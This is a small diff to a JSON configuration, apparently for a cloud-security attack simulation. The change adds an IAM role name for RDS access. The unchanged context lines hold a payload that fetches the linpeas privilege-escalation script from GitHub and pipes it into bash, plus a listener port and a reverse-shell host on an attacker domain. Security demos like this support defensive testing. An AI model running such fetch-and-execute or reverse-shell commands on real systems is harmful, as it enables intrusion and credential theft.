@@ -76,7 +76,8 @@
               "listen_port": "4444",
               "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt",
               "attack_delay": 50400,
-              "reverse_shell_host" : "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }"
+              "reverse_shell_host" : "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }",
+              "iam2rds_role_name": "rds_user_access_role_ciemdemo"
             }
           }
         }
